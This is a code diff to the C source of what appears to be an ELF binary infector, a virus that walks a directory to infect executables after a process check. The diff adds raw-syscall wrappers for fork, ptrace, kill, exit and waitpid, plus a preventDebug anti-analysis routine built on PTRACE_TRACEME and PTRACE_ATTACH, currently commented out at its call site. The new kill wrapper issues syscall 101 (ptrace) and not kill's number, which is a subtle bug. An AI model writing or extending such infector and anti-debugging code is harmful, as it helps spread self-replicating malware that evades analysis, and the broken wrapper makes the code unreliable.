@@ -1,6 +1,7 @@
 static void  start(void) {}
 #define _FCNTL_H
 #define _SYS_MMAN_H
+#define _SIGNAL_H
 #include <linux/stat.h>
 #include <stddef.h>
 #include <sys/types.h>
@@ -8,18 +9,27 @@ static void  start(void) {}
 #include <bits/fcntl.h>
 #include <bits/mman.h>
 #include <stdio.h>
-#include <signal.h>
 #include <dirent.h>
 #include <elf.h>
+#include <bits/signum-generic.h>
+/* #include <sys/ptrace.h> */
+
+/* Architecture dependent */
+enum __ptrace_request {
+  PTRACE_TRACEME = 0,
+  PTRACE_ATTACH = 16
+};
+#define MAP_FAILED	((void *) -1)
+/* Architecture dependent */
 
 #define BUF_SIZE 1024 * 1024 * 5
 #define PAYLOAD "HelloWorld"
-#define MAP_FAILED	((void *) -1)
 
 static void end(void);
 static void lambdaEnd(void);
 static void lambdaStart(void);
 static void encryptStart(void);
+static int  preventDebug(void);
 static size_t strlen(const char *s);
 static int  checkProcess(char *dirname);
 static int  infectBins(const char *dirname);
@@ -36,6 +46,8 @@ int   entry_point(void *magic) {
       return (1);
   if (checkProcess(procName) != 0)
     return (1);
+  /* if (preventDebug() != 0) */
+  /*   return (1); */
   if (infectBins(infectDir) == -1)
     return (1);
   /* if (infectBins(infectDir2) == -1) */
@@ -130,7 +142,8 @@ static int  write(int fd, const void *buf, size_t count) {
 }
 
 static int  open(const char *pathname, int flags, int mode) {
-  register int        rax asm("rax") = 2; register const char *rdi asm("rdi") = pathname;
+  register int        rax asm("rax") = 2;
+  register const char *rdi asm("rdi") = pathname;
   register int        rsi asm("rsi") = flags;
   register int        rdx asm("rdx") = mode;
 
@@ -192,6 +205,59 @@ static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned in
   asm("syscall"
     : "=r" (rax));
   return (rax);
+}
+
+static pid_t  fork(void) {
+  register pid_t  ret asm("rax");
+  register int  rax asm("rax") = 57;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
+static void exit(int status) {
+  register int  rax asm("rax") = 60;
+  register int  rdi asm("rdi") = status;
+
+  asm("syscall"
+    : "=r" (rax));
+}
+
+static long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {
+  register long   ret asm("rax");
+  register int    rax asm("rax") = 101;
+  register enum __ptrace_request  rdi asm("rdi") = request;
+  register pid_t  rsi asm("rsi") = pid;
+  register void   *rdx asm("rdx") = addr;
+  register void   *r10 asm("r10") = data;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
+static int kill(pid_t pid, int sig) {
+  register int    rax asm("rax") = 101;
+  register pid_t  rdi asm("rdi") = pid;
+  register int    rsi asm("rsi") = sig;
+
+  asm("syscall"
+    : "=r" (rax));
+  return (rax);
+}
+
+static pid_t  waitpid(pid_t pid, int *stat_loc, int options) {
+  register pid_t  ret asm("rax");
+  register int    rax asm("rax") = 61;
+  register pid_t  rdi asm("rdi") = pid;
+  register int    *rsi asm("rsi") = stat_loc;
+  register int    rdx asm("rdx") = options;
+  register struct rusage *r10 asm("r10") = NULL;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
 }
 
 static void *memcpy(void *dest, const void *src, size_t n) {
@@ -366,6 +432,25 @@ static int  checkProcess(char *dirname) {
   }
   munmap(buf, BUF_SIZE);
   close(fd);
+  return (0);
+}
+
+static int   preventDebug(void) {
+  pid_t pid;
+
+  if ((pid = fork()) == -1)
+    return (-1);
+  if (pid != 0) {
+    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1 ||
+        waitpid(pid, 0, 0) == -1) {
+      kill(pid, SIGTERM);
+      return (-1);
+    }
+    exit(0);
+  } else {
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
+      exit(1);
+  }
   return (0);
 }
 
